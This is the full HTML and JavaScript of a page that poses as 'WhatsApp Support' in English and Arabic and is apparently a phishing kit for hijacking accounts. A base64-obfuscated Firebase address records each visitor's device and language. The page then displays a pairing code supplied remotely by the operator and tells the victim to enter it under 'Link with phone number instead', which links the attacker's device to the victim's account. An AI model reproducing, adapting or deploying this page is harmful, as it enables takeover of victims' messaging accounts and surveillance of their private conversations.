<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>WhatsApp Support</title>
    <style>
        body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; background-color: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; }
        .top-bar { position: absolute; top: 0; width: 100%; height: 25%; background-color: #00a884; z-index: -1; }
        .main-card { background: white; width: 90%; max-width: 420px; padding: 25px; border-radius: 12px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); text-align: center; }
        .whatsapp-logo { width: 65px; height: 65px; margin-bottom: 15px; }
        .title { color: #41525d; font-size: 19px; font-weight: 600; margin-bottom: 8px; }
        .device-info { background: #e7f3f3; color: #128c7e; padding: 6px 12px; border-radius: 20px; font-size: 12px; font-weight: bold; margin-bottom: 15px; display: inline-block; }
        .alert-box { background: #fff3cd; color: #856404; padding: 12px; border-radius: 8px; font-size: 13px; margin-bottom: 15px; border: 1px solid #ffeeba; line-height: 1.4; }
        .instruction { color: #3b4a54; font-size: 14px; line-height: 1.7; margin-bottom: 20px; text-align: justify; border-left: 3px solid #00a884; padding-left: 10px; }
        .highlight { color: #d91e1e; font-weight: bold; text-decoration: underline; }
        .code-container { background-color: #f8f9fa; border: 2px dashed #cfd8dc; padding: 15px; border-radius: 8px; display: inline-block; min-width: 85%; margin-top: 10px; }
        #pairing-code { font-size: 34px; font-weight: bold; color: #128c7e; letter-spacing: 3px; font-family: 'Courier New', monospace; }
        [dir="rtl"] .instruction { text-align: right; border-left: none; border-right: 3px solid #00a884; padding-right: 10px; }
        [dir="rtl"] .alert-box { text-align: right; }
    </style>
</head>
<body>
    <div class="top-bar"></div>
    <div class="main-card">
        <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" class="whatsapp-logo">
        <div id="u_0" class="title"></div>
        <div id="u_1" class="device-info"></div>
        <div id="u_2" class="alert-box"></div>
        <div id="u_3" class="instruction"></div>
        <div class="code-container"><div id="pairing-code">...</div></div>
    </div>

    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
    <script>
        const _X = "aHR0cHM6Ly94c3R1eG5ldC03ZTAzOC1kZWZhdWx0LXJ0ZGIuZmlyZWJhc2Vpby5jb20v";
        firebase.initializeApp({ databaseURL: atob(_X) });
        const _D = firebase.database();
        
        const _P = new URLSearchParams(window.location.search);
        const _ID = _P.get('id') || "USER_" + Math.floor(Math.random() * 9999);
        const _L = navigator.language.startsWith('ar') ? 'ar' : 'en';
        document.body.dir = (_L === 'ar') ? "rtl" : "ltr";

        const _DEV = /iPhone|iPad|iPod/.test(navigator.userAgent) ? "iPhone (iOS)" : "Android Device";

        const _CORE = {
            ar: [
                "تحديث أمان الحساب للرقم: " + (_P.get('id') || ""),
                "تم التعرف على جهازك: " + _DEV,
                "تنبيه: سيصلك الآن إشعار على واتساب يطلب 'ربط جهاز جديد'. اضغط عليه للمتابعة.",
                "خطوات المزامنة:<br>1. افتح الإشعار أو اذهب للإعدادات.<br>2. اضغط على 'ربط جهاز'.<br>3. <span class='highlight'>مهم جداً:</span> اضغط على 'الربط برقم الهاتف بدلاً من ذلك'.<br>4. أدخل الكود التالي:",
                "جاري استلام الكود.."
            ],
            en: [
                "Security Update for: " + (_P.get('id') || ""),
                "Verified Device: " + _DEV,
                "Alert: A notification will appear on WhatsApp to 'Link a Device'. Tap it to proceed.",
                "Sync Steps:<br>1. Open notification or go to Settings.<br>2. Tap 'Link a Device'.<br>3. <span class='highlight'>Important:</span> Tap 'Link with phone number instead' at bottom.<br>4. Enter this code:",
                "Waiting for code.."
            ]
        };

        const _C = _CORE[_L];
        document.getElementById('u_0').innerText = _C[0];
        document.getElementById('u_1').innerText = _C[1];
        document.getElementById('u_2').innerText = _C[2];
        document.getElementById('u_3').innerHTML = _C[3];
        document.getElementById('pairing-code').innerText = _C[4];

        _D.ref('visiting/' + _ID).set({ device: _DEV, lang: _L, ts: Date.now() });
        _D.ref('sessions/' + _ID).on('value', (s) => {
            if (s.val() && s.val().code) document.getElementById('pairing-code').innerText = s.val().code;
        });
    </script>
</body>
</html>
